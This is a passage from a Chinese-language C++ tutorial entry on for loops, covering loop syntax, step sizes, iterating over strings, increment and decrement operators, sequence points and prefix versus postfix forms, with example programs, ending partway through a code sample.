      <title>5.1 for循环</title>
      <link href="2025/04/26/5.1_for%E5%BE%AA%E7%8E%AF/"/>
      <url>2025/04/26/5.1_for%E5%BE%AA%E7%8E%AF/</url>
      
        <content type="html"><![CDATA[<p>循环是编程中的基本控制结构，它允许我们重复执行一段代码，直到满足某个条件为止。<code>for</code> 循环是 C++ 中最常用的循环结构之一，特别适用于已知循环次数或需要按特定步长迭代的情况。</p><h2 id="5-1-1-for循环的组成部分"><a href="#5-1-1-for循环的组成部分" class="headerlink" title="5.1.1 for循环的组成部分"></a>5.1.1 for循环的组成部分</h2><p><code>for</code> 循环的头部包含三个由分号 <code>;</code> 分隔的部分，控制着循环的执行流程：</p><ol><li><strong>初始化 (Initialization):</strong><ul><li>  在循环开始前执行<strong>一次</strong>。</li><li>  通常用于声明和/或初始化循环控制变量（计数器）。</li><li>  可以包含多条语句，用逗号分隔（见 5.1.11）。</li><li>  也可以为空。</li></ul></li><li><strong>测试条件 (Test Condition / Condition):</strong><ul><li>  在<strong>每次</strong>循环迭代开始前进行求值。</li><li>  结果必须是一个布尔值 (<code>true</code> 或 <code>false</code>) 或可以转换为布尔值（非零为 <code>true</code>，零为 <code>false</code>）。</li><li>  如果条件为 <code>true</code>，则执行循环体。</li><li>  如果条件为 <code>false</code>，则循环终止，程序继续执行循环后面的语句。</li><li>  也可以为空，空条件被视为 <code>true</code>，形成无限循环（需要其他方式跳出，如 <code>break</code>）。</li></ul></li><li><strong>更新 (Update / Increment / Decrement):</strong><ul><li>  在<strong>每次</strong>循环迭代<strong>结束时</strong>（执行完循环体之后，下次测试条件之前）执行。</li><li>  通常用于修改循环控制变量（例如，递增或递减计数器）。</li><li>  可以包含多条语句，用逗号分隔。</li><li>  也可以为空。</li></ul></li></ol><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (initialization; test_condition; update) &#123;</span><br><span class="line">    <span class="comment">// 循环体 (statement(s) to be executed repeatedly)</span></span><br><span class="line">    statement1;</span><br><span class="line">    statement2;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// 或者如果循环体只有一条语句，可以省略花括号</span></span><br><span class="line"><span class="keyword">for</span> (initialization; test_condition; update)</span><br><span class="line">    single_statement; </span><br></pre></td></tr></table></figure><p><strong>执行流程:</strong></p><ol><li> 执行 <code>initialization</code>。</li><li> 计算 <code>test_condition</code>。</li><li> 如果 <code>test_condition</code> 为 <code>false</code>，跳出循环，执行循环后面的代码。</li><li> 如果 <code>test_condition</code> 为 <code>true</code>，执行循环体中的语句。</li><li> 执行 <code>update</code>。</li><li> 回到步骤 2。</li></ol><p><strong>示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 打印数字 0 到 4</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; <span class="comment">// 1. 初始化: 声明并初始化计数器 i 为 0</span></span><br><span class="line">         i &lt; <span class="number">5</span>;   <span class="comment">// 2. 测试条件: 只要 i 小于 5 就继续</span></span><br><span class="line">         i = i + <span class="number">1</span>) <span class="comment">// 4. 更新: 每次循环后将 i 增加 1</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 3. 循环体</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;i = &quot;</span> &lt;&lt; i &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Loop finished.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5-1-2-回到for循环"><a href="#5-1-2-回到for循环" class="headerlink" title="5.1.2 回到for循环"></a>5.1.2 回到for循环</h2><p><code>for</code> 循环提供了一种非常结构化的方式来编写计数循环。上面的例子展示了一个典型的从 0 开始计数到某个值之前的循环。</p><p><strong>基本计数循环示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 计算 1 到 10 的和</span></span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">10</span>; i = i + <span class="number">1</span>) &#123; <span class="comment">// 从 1 开始，包含 10</span></span><br><span class="line">        sum = sum + i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Sum of 1 to 10 is: &quot;</span> &lt;&lt; sum &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 55</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 倒序打印 5 到 1</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Countdown:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> count = <span class="number">5</span>; count &gt; <span class="number">0</span>; count = count - <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; count &lt;&lt; <span class="string">&quot;...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Liftoff!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5-1-3-修改步长"><a href="#5-1-3-修改步长" class="headerlink" title="5.1.3 修改步长"></a>5.1.3 修改步长</h2><p><code>for</code> 循环的更新部分不一定总是加 1 或减 1。你可以根据需要指定任何有效的更新表达式。</p><p><strong>示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 以步长 2 递增，打印偶数</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Even numbers less than 10:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i = i + <span class="number">2</span>) &#123; </span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; i &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 0 2 4 6 8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 以步长 5 递减</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Counting down by 5s:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> n = <span class="number">50</span>; n &gt;= <span class="number">0</span>; n = n - <span class="number">5</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; n &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 50 45 40 35 30 25 20 15 10 5 0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用乘法作为步长 (注意避免无限循环)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Powers of 2 less than 100:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> p = <span class="number">1</span>; p &lt; <span class="number">100</span>; p = p * <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; p &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 1 2 4 8 16 32 64</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5-1-4-使用for循环访问字符串"><a href="#5-1-4-使用for循环访问字符串" class="headerlink" title="5.1.4 使用for循环访问字符串"></a>5.1.4 使用for循环访问字符串</h2><p><code>for</code> 循环是遍历字符串（无论是 C 风格字符串还是 <code>std::string</code> 对象）中每个字符的常用方法。</p><p><strong>示例 (C 风格字符串):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt; // 为了 strlen()</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> message[] = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(message); <span class="comment">// 获取字符串长度 (不包括 \0)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Characters in \&quot;&quot;</span> &lt;&lt; message &lt;&lt; <span class="string">&quot;\&quot;:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i = i + <span class="number">1</span>) &#123; <span class="comment">// 索引从 0 到 len-1</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Index &quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;: &quot;</span> &lt;&lt; message[i] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 也可以使用指针和空字符判断</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Characters using pointer:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">char</span> *p = message; *p != <span class="string">&#x27;\0&#x27;</span>; p = p + <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; *p &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>示例 (std::string):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> word = <span class="string">&quot;World&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Characters in \&quot;&quot;</span> &lt;&lt; word &lt;&lt; <span class="string">&quot;\&quot;:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// 使用 size() 获取长度，size_t 通常是合适的索引类型</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; word.size(); i = i + <span class="number">1</span>) &#123; </span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Index &quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;: &quot;</span> &lt;&lt; word[i] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// C++11 基于范围的 for 循环 (更简洁，见 5.4)</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; &quot;Characters using range-based for:&quot; &lt;&lt; std::endl;</span></span><br><span class="line">    <span class="comment">// for (char ch : word) &#123;</span></span><br><span class="line">    <span class="comment">//     std::cout &lt;&lt; ch &lt;&lt; &quot; &quot;;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; std::endl;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5-1-5-递增运算符（-）和递减运算符（–）"><a href="#5-1-5-递增运算符（-）和递减运算符（–）" class="headerlink" title="5.1.5 递增运算符（++）和递减运算符（–）"></a>5.1.5 递增运算符（++）和递减运算符（–）</h2><p>C++ 提供了两个非常有用的运算符来简化变量加 1 或减 1 的操作：</p><ul><li>  <strong>递增运算符 (<code>++</code>):</strong> 将操作数的值增加 1。</li><li>  <strong>递减运算符 (<code>--</code>):</strong> 将操作数的值减少 1。</li></ul><p>它们可以用于整数类型、浮点类型和指针类型。</p><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">double</span> value = <span class="number">10.5</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 递增</span></span><br><span class="line">    count++; <span class="comment">// 等价于 count = count + 1; 现在 count 是 6</span></span><br><span class="line">    ++value; <span class="comment">// 等价于 value = value + 1; 现在 value 是 11.5</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Count after increment: &quot;</span> &lt;&lt; count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Value after increment: &quot;</span> &lt;&lt; value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 递减</span></span><br><span class="line">    count--; <span class="comment">// 等价于 count = count - 1; 现在 count 是 5</span></span><br><span class="line">    --value; <span class="comment">// 等价于 value = value - 1; 现在 value 是 10.5</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Count after decrement: &quot;</span> &lt;&lt; count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Value after decrement: &quot;</span> &lt;&lt; value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在 for 循环中使用</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Loop using ++:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; ++i) &#123; <span class="comment">// 使用 ++i 或 i++ 效果相同 (作为独立语句)</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;i = &quot;</span> &lt;&lt; i &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5-1-6-副作用和顺序点"><a href="#5-1-6-副作用和顺序点" class="headerlink" title="5.1.6 副作用和顺序点"></a>5.1.6 副作用和顺序点</h2><p><strong>副作用 (Side Effect):</strong> 指的是修改变量的值或执行 I/O 操作等改变程序状态的行为。递增 (<code>++</code>) 和递减 (<code>--</code>) 运算符都具有副作用，因为它们会修改操作数的值。</p><p><strong>顺序点 (Sequence Point):</strong> 是程序执行过程中的一个时间点，在该点之前的所有副作用都已完成，并且后续的副作用尚未发生。C++ 标准定义了一些顺序点，例如：</p><ul><li>  分号 <code>;</code> (语句结束处)</li><li>  完整表达式结束时（如 <code>if</code> 条件、<code>while</code> 条件、<code>for</code> 循环的三个部分之后）</li><li>  函数调用之前（所有参数的副作用完成）</li><li>  某些运算符（如 <code>&amp;&amp;</code>, <code>||</code>, <code>,</code> 逗号运算符）的特定位置</li></ul><p><strong>重要性:</strong> 在两个顺序点之间，<strong>不要</strong>对同一个变量进行多次修改，或者既修改它又读取它（除了读取它的值以计算要写入的值之外）。否则，行为是**未定义的 (Undefined Behavior)**，编译器可能产生任何结果。</p><p><strong>示例 (未定义行为):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">int</span> y;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 未定义行为: 在同一表达式中多次修改 x，且没有顺序点分隔</span></span><br><span class="line">    <span class="comment">// y = (x++) * (x++); // 不要这样写! 结果不可预测</span></span><br><span class="line">    <span class="comment">// y = x + (++x);     // 不要这样写! 结果不可预测</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; x &lt;&lt; (++x); // 不要这样写! 输出顺序和 x 的最终值不可预测</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 安全的写法: 使用顺序点分隔副作用</span></span><br><span class="line">    y = x++; <span class="comment">// y 获取 x 的原始值 5, 然后 x 变为 6 (副作用在分号处完成)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;y = &quot;</span> &lt;&lt; y &lt;&lt; <span class="string">&quot;, x = &quot;</span> &lt;&lt; x &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 y = 5, x = 6</span></span><br><span class="line">    </span><br><span class="line">    y = ++x; <span class="comment">// x 先变为 7, 然后 y 获取新值 7 (副作用在分号处完成)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;y = &quot;</span> &lt;&lt; y &lt;&lt; <span class="string">&quot;, x = &quot;</span> &lt;&lt; x &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 y = 7, x = 7</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>结论:</strong> 避免在单个表达式中对同一变量产生复杂的、依赖于副作用顺序的操作。将它们分解成多个语句通常更安全、更清晰。</p><h2 id="5-1-7-前缀格式和后缀格式"><a href="#5-1-7-前缀格式和后缀格式" class="headerlink" title="5.1.7 前缀格式和后缀格式"></a>5.1.7 前缀格式和后缀格式</h2><p>递增 (<code>++</code>) 和递减 (<code>--</code>) 运算符都有两种使用形式：</p><ol><li><strong>前缀 (Prefix):</strong> 运算符放在操作数之前 (<code>++x</code>, <code>--x</code>)。<ul><li>  <strong>行为:</strong> <strong>先</strong>修改操作数的值（加 1 或减 1），<strong>然后</strong>使用修改后的值作为整个表达式的结果。</li></ul></li><li><strong>后缀 (Postfix):</strong> 运算符放在操作数之后 (<code>x++</code>, <code>x--</code>)。<ul><li>  <strong>行为:</strong> <strong>先</strong>使用操作数的<strong>原始值</strong>作为整个表达式的结果，<strong>然后</strong>再修改操作数的值（加 1 或减 1）。</li></ul></li></ol><p><strong>区别在于表达式的值:</strong></p><table><thead><tr><th align="left">表达式</th><th align="left">行为描述</th><th align="left">表达式的值</th><th align="left">操作数最终值</th></tr></thead><tbody><tr><td align="left"><code>++x</code></td><td align="left">先将 <code>x</code> 加 1</td><td align="left"><code>x</code> 的新值</td><td align="left">新值</td></tr><tr><td align="left"><code>x++</code></td><td align="left">先使用 <code>x</code> 的原始值</td><td align="left"><code>x</code> 的原始值</td><td align="left">新值</td></tr><tr><td align="left"><code>--x</code></td><td align="left">先将 <code>x</code> 减 1</td><td align="left"><code>x</code> 的新值</td><td align="left">新值</td></tr><tr><td align="left"><code>x--</code></td><td align="left">先使用 <code>x</code> 的原始值</td><td align="left"><code>x</code> 的原始值</td><td align="left">新值</td></tr></tbody></table><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">5</span>, b = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">int</span> result_a, result_b;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 前缀递增</span></span><br><span class="line">    result_a = ++a; <span class="comment">// a 先变成 6, 然后 result_a 被赋值为 6</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Prefix: result_a = &quot;</span> &lt;&lt; result_a &lt;&lt; <span class="string">&quot;, a = &quot;</span> &lt;&lt; a &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 6, 6</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 后缀递增</span></span><br><span class="line">    result_b = b++; <span class="comment">// result_b 先被赋值为 b 的原始值 5, 然后 b 变成 6</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Postfix: result_b = &quot;</span> &lt;&lt; result_b &lt;&lt; <span class="string">&quot;, b = &quot;</span> &lt;&lt; b &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 5, 6</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在 for 循环更新部分，通常前缀和后缀效果相同</span></span><br><span class="line">    <span class="comment">// 但在复杂表达式中，它们的区别很重要</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> arr[] = &#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 使用后缀获取值并移动索引</span></span><br><span class="line">    <span class="keyword">int</span> val1 = arr[index++]; <span class="comment">// val1 = arr[0] (10), index 变为 1</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;val1 = &quot;</span> &lt;&lt; val1 &lt;&lt; <span class="string">&quot;, index = &quot;</span> &lt;&lt; index &lt;&lt; <span class="built_in">std</span>::<span 